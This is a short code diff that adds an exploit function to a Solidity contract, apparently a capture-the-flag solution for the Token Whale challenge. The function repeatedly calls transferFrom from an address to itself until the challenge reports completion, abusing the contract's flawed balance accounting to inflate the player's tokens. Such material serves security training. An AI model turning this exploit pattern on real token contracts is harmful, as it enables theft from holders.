@@ -70,4 +70,12 @@ contract ExploitContract {
     }
 
     // write your exploit functions below
+    function exploit(address toAddress) public {
+        // assume exploit has allowance to spend players tokens
+        // keep transferring tokens to player until balance is 1,000,000
+        while (!tokenWhale.isComplete()) {
+            tokenWhale.transferFrom(toAddress, toAddress, tokenWhale.balanceOf(toAddress));
+        }
+
+    }
 }
